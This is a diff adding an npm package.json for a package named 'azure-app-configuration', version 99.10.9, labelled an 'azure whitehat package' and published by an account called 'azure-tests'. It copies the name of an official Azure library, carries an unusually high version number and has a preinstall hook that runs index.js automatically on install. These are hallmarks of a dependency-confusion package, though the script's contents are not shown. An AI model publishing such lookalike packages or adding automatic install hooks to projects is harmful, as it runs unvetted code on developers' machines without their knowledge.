@@ -1,0 +1,39 @@
+{
+    "name": "azure-app-configuration",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-app-configuration@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-PbloOm601+/daHEvWHit9XdhHlI4xXbcyKxns4atMaK1DePJPLjRLVLw40xNX5aDR1nMtjtGGt3l8el/NUA3Ag==",
+        "shasum": "83b76db1a48a28ed72e041a1bab544e2fceb8282",
+        "tarball": "https://registry.npmjs.org/azure-app-configuration/-/azure-app-configuration-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3587,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSsSCRA9TVsSAnZWagAAm20P/RbDDR62jfZWbEPFL8Vr\n/8LKIOqVAoxyJMwmsmuVszBVI/F0fRUi/e9I2Iy2D3EmnlKESIhg7GqiBNRS\nmcnaYsR2oaidPuCWeomupA9YK0py0xAUXmZbOFYwLvdGiQt/hj93xI4rgLUm\nN4nFxQtXJ4RC4nmuxm4JbBSQH1PW3wAuzwG+sykA1FftjyDLjQsXRohAE1M3\nFeWZ41+WqEgIEfbrQ2afOKFGyntnPhmI3vq6ID6CAzK6tS4wBgVuYvXxCDZh\ncBII/nYHSLExlPeFFZR4mI2BWx7N6ASPVk9yRzauvDcUPcE+BZyai09gwhPs\ns6PmKsHZMbTl6hIpSePzZE5SffquB+EdAiHRmib0jAId9mLNVzicIAyBZ1ig\nj7G3pIvMe2rZ61LnR32gr8zqZlfXqT8djms31SRMLN265l8cYVYaXpz3UcZ3\n54/BlVypFPKXed+1ETj96+bEIydeWE6ss9ZsT8zvX6hiqnKeZ/wK9CxANCDR\nYPBIbhpJL0bCPJNuIDfbCJxuiaqmJzSXxM72mcr1tB6pMgpz2TVJeqBjJ6z/\nEYSRoIH2pBrFpFbRhqjqn08QmRibSEgTi1N76TKSmlUUvGCw5w79RyqG7JHq\ngj8ERucICwtSefBdanYF5IKVOVIy3kcKenKv4CrPkIYzie3mDvZabb7qOyuB\njDwI\r\n=hl8s\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-app-configuration_99.10.9_1637952274455_0.8406772889122658"
+    },
+    "_hasShrinkwrap": false
+}
